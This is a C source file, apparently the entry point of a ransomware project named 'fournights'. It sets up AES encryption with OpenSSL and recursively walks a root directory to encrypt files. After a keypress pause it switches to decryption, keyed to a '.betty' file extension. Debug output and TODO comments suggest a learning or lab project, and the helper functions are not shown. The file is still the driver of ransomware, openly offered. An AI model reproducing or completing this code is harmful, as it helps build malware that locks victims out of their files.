#include "fournights.h"
/**
  * sighandler - traps signals
  * @sig: Signal to trap
 **/
static void sighandler(int sig)
{
	if (sig == SIGINT)
	{
		write(1, "\nWTF?!\n", 7);
		exit(1);
	}
}


/**
  * main - Entry point
  * @ac: argument count
  * @av: argument vectors
  * Return: 0
  * TODO: need to eliminate hard coded strings.
 **/
int main(void)
{
	struct ransom_s ransom;
	EVP_CIPHER_CTX encrypt;
	EVP_CIPHER_CTX decrypt;

	/** handle signals
	  * TODO: Account for errors
	 **/
	signal(SIGINT, sighandler);

	init_struct(&ransom);
	/* ENCRYPT */
	aes_init((unsigned char *)ransom.key, my_strlen(ransom.key), (unsigned char *)&(ransom.salt), &encrypt, &decrypt, &ransom);
	ransom.target_file_buf->cipher = &encrypt;
#ifndef NO_DEBUG
	printf("%s\n", ransom.root_path);
	printf("About to enter recurse_ls fxn\n");
#endif
	recurse_ls((char *)ransom.root_path, &ransom);
#ifndef NO_DEBUG
	print_for_debug(ransom);
#endif
	/* DECRYPT */
#ifndef NO_DEBUG
	printf("######################\n");
	printf("Starting to decrypt!\n");
	printf("######################\n");
#endif
	ransom.cipher_flag = 'd';
	ransom.target_file_buf->cipher = &decrypt;

	/* reset file extension tokens */
	my_strncat(ransom.file_exts_whole_str, ".betty", 0, 6);
	ransom.file_exts_whole_str[6] = '\0';
	ransom.file_extensions[1] = NULL;

#ifndef NO_DEBUG
	printf("%s\n", ransom.file_exts_whole_str);
	printf("%s\n", ransom.file_extensions[0]);
	print_for_debug(ransom);
#endif
	getchar();

	recurse_ls((char *)ransom.root_path, &ransom);
	EVP_CIPHER_CTX_cleanup(&encrypt);
	EVP_CIPHER_CTX_cleanup(&decrypt);
	free_ransom_struct(&ransom);
	return (EXIT_SUCCESS);
}
